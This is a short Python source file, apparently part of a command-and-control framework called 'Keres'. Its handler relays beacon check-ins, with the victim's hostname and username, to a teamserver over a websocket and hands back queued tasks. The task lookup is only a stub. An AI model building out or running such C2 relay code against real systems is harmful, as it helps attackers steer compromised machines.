import logging
from typing import Dict, Any, Optional

logger = logging.getLogger("Keres.Handlers")


async def handle_incoming_data(data: Dict[str, Any], ws_client) -> Optional[Dict[str, Any]]:
    try:
        beacon_id = data.get("beacon_id")
        if not beacon_id:
            logger.warning("[!] Received data without a beacon_id. Dropping.")
            return None

        event_payload = {
            "event": "beacon_checkin",
            "beacon_id": beacon_id,
            "data": data.get("payload", {}),
            "metadata": {
                "hostname": data.get("hostname"),
                "username": data.get("username")
            }
        }

        if ws_client and ws_client.connection:
            await ws_client.send_json(event_payload)
            logger.info(f"[*] Forwarded data for Beacon {beacon_id} to Teamserver.")
        else:
            logger.error(f"[-] Backhaul tunnel offline. Cannot forward Beacon {beacon_id}.")
            return {"status": "error", "message": "Upstream connection lost"}

        task = await get_pending_task(beacon_id)

        return {
            "status": "ok",
            "task": task if task else "IDLE"
        }

    except Exception as e:
        logger.error(f"[-] Handler Error: {e}")
        return {"status": "error", "message": "Internal processing failure"}


async def get_pending_task(beacon_id: str):
    return None